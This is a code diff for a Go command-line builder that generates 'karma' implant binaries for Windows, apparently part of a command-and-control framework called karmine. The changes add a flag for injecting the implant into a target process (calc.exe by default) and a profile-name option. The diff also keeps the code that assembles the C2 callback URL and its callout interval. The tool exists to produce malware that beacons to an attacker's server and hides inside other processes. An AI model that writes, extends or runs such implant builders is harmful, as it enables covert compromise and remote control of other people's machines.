@@ -20,11 +20,12 @@ import (
 )
 
 var (
-	app      = kingpin.New("new", "create new karmine binary instances")
-	karmaCmd = app.Command("karma", "create a karma instance (windows only)")
-	outfile  = app.Flag("outfile", "write instance to a location").String()
-	arch     = karmaCmd.Flag("arch", "architecture to compile binary for").Default("amd64").String()
-	waitSec  = karmaCmd.Flag("interval", "time interval between c2 callouts in seconds").Default("60").String()
+	app        = kingpin.New("new", "create new karmine binary instances")
+	outfile    = app.Flag("outfile", "write instance to a location").String()
+	name       = app.Flag("name", "name of profile to create (defaults to random string)").String()
+	karmaCmd   = app.Command("karma", "create a karma instance (windows only)")
+	waitSec    = karmaCmd.Flag("interval", "time interval between c2 callouts in seconds").Default("60").String()
+	injectInto = karmaCmd.Flag("inject", "target process to inject karma binary into").Default("C:\\Windows\\System32\\calc.exe").String()
 
 	conf = &models.TmpConf{}
 )
@@ -45,12 +46,20 @@ func main() {
 	switch kingpin.MustParse(app.Parse(os.Args[1:])) {
 	case karmaCmd.FullCommand():
 		c2 := "https://" + conf.LHost + ":" + conf.LPort + conf.Endpoint
-		id, err = Karma(*arch, c2, *waitSec, db)
+		id, err = Karma(c2, *waitSec, *injectInto, db)
 		if err != nil {
 			log.Fatal(err)
 		}
 	}
-	if err = datastore.AddProfile(id, RandString(), kingpin.MustParse(app.Parse(os.Args[1:]))); err != nil {
+	var profileName string
+	if len(*name) == 0 {
+		profileName = RandString()
+	} else if len(*name) > 12 {
+		log.Fatal("name must be a maximum of 12 characters")
+	} else {
+		profileName = *name
+	}
+	if err = datastore.AddProfile(id, profileName, kingpin.MustParse(app.Parse(os.Args[1:]))); err != nil {
 		log.Fatal(err)
 	}
 }
@@ -63,7 +72,7 @@ func RandString() string {
 	return string(dst)
 }
 
-func Karma(GOARCH, C2, waitSecs string, db *datastore.Kdb) (string, error) {
+func Karma(C2, waitSecs, inject string, db *datastore.Kdb) (string, error) {
 	conf, err := config.GetFullConfig()
 	if err != nil {
 		return "", err
@@ -106,7 +115,6 @@ func Karma(GOARCH, C2, waitSecs string, db *datastore.Kdb) (string, error) {
 	}
 	cmd := exec.Command(
 		build,
-		GOARCH,
 		encC2,
 		waitSecs,
 		cert,
@@ -117,6 +125,7 @@ func Karma(GOARCH, C2, waitSecs string, db *datastore.Kdb) (string, error) {
 		encID,
 		"",
 		*outfile,
+		inject,
 	)
 	var cout, cerr bytes.Buffer
 	cmd.Stderr = &cerr
